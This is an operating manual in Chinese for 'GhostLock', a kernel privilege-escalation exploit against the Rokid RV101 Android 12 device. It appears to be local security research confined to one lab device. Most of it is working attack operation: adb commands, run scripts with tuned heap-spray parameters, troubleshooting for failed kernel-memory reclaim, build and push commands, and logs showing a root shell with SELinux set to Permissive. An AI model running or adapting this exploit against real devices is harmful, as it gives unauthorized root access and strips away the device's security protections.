# GHOSTLOCK RV101 — Root 取得操作說明（v9.60）

> English: [GHOSTLOCK_ROOT_操作說明_EN.md](GHOSTLOCK_ROOT_操作說明_EN.md)
> ⚠ **2026-09-13 更新**：repo 路徑已改為 `/home/kali/rokid_root`（本文原寫 Windows 路徑，已全數替換）。
> 本檔為**手動 fallback** 操作說明；App 端引擎已改為執行期自動探測（`AutoGhostlockEngine`），
> 一般情況只需 `deploy/root_bridge.sh` 或 `deploy/start_shizuku.sh`。最新流程見 `docs/deploy.md`。


> 適用裝置：Rokid RV101（serial `<DEVICE_SERIAL>`，Android 12，kernel 5.10.209-perf）。
> 用途：本地權限提升研究 — 取得 **uid=0 gid=0** 的 root shell，並關閉 SELinux。
> **範圍**：僅限此單一受控實驗裝置，勿泛化或加入任何遠端/持久化/隱蔽功能。

---

## 0. 成果摘要（現在能做到什麼）

執行成功後，子進程回報：

```
child uid = 0 (0x00000000) gid = 0 (0x00000000)
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
```

- `uid=0`、`gid=0`（乾淨 root，非垃圾 gid）。
- `getenforce` 回 `Permissive`（SELinux 已關閉）。
- 產生 root 擁有的 `/data/local/tmp/su_gl`（root 寫入能力實證）。
- 啟動互動式 `/system/bin/sh` root shell。

**已知機制**：mode-5 寫入把 `init_cred` 寫進 child 的 `task->cred`（uid=0），
child 再用 `setgroups(0)+setgid(0)` 把 mode-5 打爆的 gid 修回 0（user-space，無額外 reclaim）。

---

## 1. 前置需求

| 項 | 值 |
|---|---|
| 裝置 serial | `<DEVICE_SERIAL>` |
| adb（Windows） | `/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe` |
| 裝置上的二進位 | `/data/local/tmp/ghostlock_rv101` |
| 二進位 sha1 | `4eeb98171ed21113130d5f2676a0bd283c8f56c7`（v9.60） |
| 原始碼 | `/home/kali/rokid_root/source_code/ghostlock_rv101/` |
| 包裝腳本 | `/home/kali/rokid_root/scripts/ghostlock_run.sh`、`boot_run_loop.sh` |

先確認二進位正確（sha1 必須一致）：

```bash
ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"; S="<DEVICE_SERIAL>"
"$ADB" -s $S shell sha1sum /data/local/tmp/ghostlock_rv101
# 應回：4eeb98171ed21113130d5f2676a0bd283c8f56c7
```

---

## 2. 步驟 1 — 檢查 boot 健康度（最重要）

Root 能否成功的**唯一變數**是 boot 健康度（`/proc/loadavg` 第 4 欄 = 系統總 thread 數 `nr_threads`）。

```bash
"$ADB" -s $S shell cat /proc/loadavg
# 範例：0.32 0.24 0.23 1/1247 25299
#                    ^^^^^^ 第4欄 running/total，total=1247
```

判定：
- **total < 3000** → 好 boot，可執行。
- **total > 5000**（camera/ISP 服務卡住爆 thread）→ **reboot 再等**。

```bash
"$ADB" -s $S reboot   # 壞 boot 直接重開
```

> 好 boot 通常出現在開機後 ~2–6 分鐘；關鍵是 `nr_threads < 3000`，不是 uptime。

---

## 3. 步驟 2 — 執行（二選一）

### 方式 A：單次執行（手動）

```bash
cd /home/kali/rokid_root
./scripts/ghostlock_run.sh w2 v960 \
  "GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1 /data/local/tmp/ghostlock_rv101"
```

### 方式 B：自動重試（推薦，會自動 reboot 直到成功）

```bash
cd /home/kali/rokid_root
./scripts/boot_run_loop.sh 6 w2 v960 "gid = 0 (" \
  "GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1" /data/local/tmp/ghostlock_rv101
```

- 方式 B 會：`reboot → 等開機 → 等 nr_threads<2500 → timeout 240s 跑 → grep 成功 → 停/重來`。
- 成功時印出 `SUCCESS_LOG=...`，log 存在 `reports/ghostlock_runlogs/`。

---

## 4. 步驟 3 — 確認成功

在 log 或裝置上找這些判據（任一條即成功）：

```bash
# 1) 裝置上確認 SELinux 已關閉
"$ADB" -s $S shell getenforce        # 應回 Permissive

# 2) 確認 root 寫入能力（su_gl 由 root 擁有）
"$ADB" -s $S shell "ls -la /data/local/tmp/su_gl"
# 應回：-rwxr-xr-x 1 root ... /data/local/tmp/su_gl
```

log 內的成功關鍵行：

```
[*] child uid = 0 (0x00000000) gid = 0 (0x00000000)
[+] child is root!
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
```

---

## 5. 環境變數說明

| 變數 | 預設 | 作用 |
|---|---|---|
| `GL_PURGE_CNT` | 700（用 0） | purge squad 數量；**設 0** 避免 kernel-stack purge 埋掉 leak slab |
| `GL_TAIL_KILLS` | 0（用 16） | 跨幾個 dummy slab 殺第一個 child 以觸發 leak slab discard（14=最小值） |
| `GL_DUMMY_KILLS` | 0 | phase-3 dummy kill 數；**設 0** |
| `W2_ATTEMPTS` | 10（用 1） | W2 round 數 |
| `FOPS_ATTEMPTS` | 3 | FOPS install 重試次數（v9.60 新增，可調 1–6） |
| `GL_SKB_PAD` | 0 | SKB payload 偏移 |

> 官方執行參數：`GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1`。

---

## 6. 常見問題（Troubleshooting）

| 現象 | 原因 | 處理 |
|---|---|---|
| log 出現 `kernelsnitch mm leak failed (… r=8)` 或 `dummy clones ok=… fail=… (errno=11)` | **壞 boot**：nr_threads 太高，fork 資源耗盡 | `reboot`，等 `nr_threads<3000` 再跑 |
| `install_fake_fops_v2 DIAG: write#1 MISSED`（多次） | **reclaim flake**：SKB 搶不到 leak slab（o2 churn） | 直接 `reboot` 重試；不必在同 boot 硬 retry |
| 開機後 6 分鐘仍拿不到 | camera/ISP 服務開始爆 thread（壞 boot） | `reboot`，抓更早的時機（開機 2–5 分鐘內） |
| 裝置突然離線 / `device not found` | 可能 reclaim 資源爆量觸發 panic | 等重開機，換 fresh boot 再跑；記下最後 uptime |
| `id -g` 顯示垃圾數字 | 舊版（v957）的 gid clobber | **升級到 v9.60**（已用 user-space setgid 修復） |
| 成功後想在 root shell 餵指令，但管線 stdin 沒反應 | **Windows adb.exe 經 WSL interop 不轉送 pipe stdin** 到裝置 shell（2026-08-23 實踩） | 成功後系統已 Permissive：一般 `adb shell` 直接可 `setprop`/`dumpsys`/多數操作；需真 uid=0 時改寫 `/data/local/tmp/.ghostlock_root.sh` 內容後重跑 exploit |

---

## 7. 重建 / 推檔（改原始碼後才需要）

```bash
cd /home/kali/rokid_root/source_code/ghostlock_rv101
NDKBIN="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/ndk/android-ndk-r27d/toolchains/llvm/prebuilt/windows-x86_64/bin"
"$NDKBIN/clang.exe" --target=aarch64-linux-android31 -O2 -Wall -Wextra \
  -Wno-unused-parameter -Wno-sign-compare -fno-stack-protector -fPIE -Isrc \
  -include target_rv101.h -o build/ghostlock_rv101 src/main.c src/util.c src/route.c \
  -pie -static-libgcc -pthread

ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"
"$ADB" -s <DEVICE_SERIAL> push build/ghostlock_rv101 /data/local/tmp/ghostlock_rv101
"$ADB" -s <DEVICE_SERIAL> shell "chmod 755 /data/local/tmp/ghostlock_rv101"
```

---

## 8. 本版（v9.60）修正了什麼（加速 root）

1. **`FOPS_ATTEMPTS` 從固定 6 改成 env 可調（預設 3）**：第 3 次之後 reclaim 已退化（dip=0，
   memfd pin 累積餓死 per-CPU partial 鏈），retry 只會白燒 ~30–60s/次。現在壞 boot 更快放棄、
   更快 reboot。
2. **修復 `v9.55 fork-limit` 診斷 bug**：原本印 `errno=0 Success`（`dfirst_err` 在列印前未賦值），
   現在先擷取 `clone()` 的 errno 再列印，壞 boot 可看到真實 `errno=11 (EAGAIN)`。
3. **更新版本 banner** `v9.30 → v9.60`。
4. **移除未使用的 `timer_reset()`**（消除 build warning）。

---

## 9. 一次完整示範（v9.60 實測，boot 後 ~113s 成功）

```
[+] ghostlock_rv101 v9.60 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
[+] KASLR: slide=0x00000026ba000000 base=0xffffffe6c2000000 (2 anchors)
[*] FOPS install attempt 1/3
[*] install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 17, ...)
[*] round 1/1: child=9071 prev=0xffffff803c7c4dc8 ... stable=1 task=0xffffff803c7c4900
[*] child uid = 0 (0x00000000) gid = 0 (0x00000000)
[+] child is root!
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
[*] [T+113411ms] exploit complete — root shell spawned via /data/local/tmp/.ghostlock_root.sh
```

對應 log：`reports/ghostlock_runlogs/run_w2_demo_v960_142523.log`。
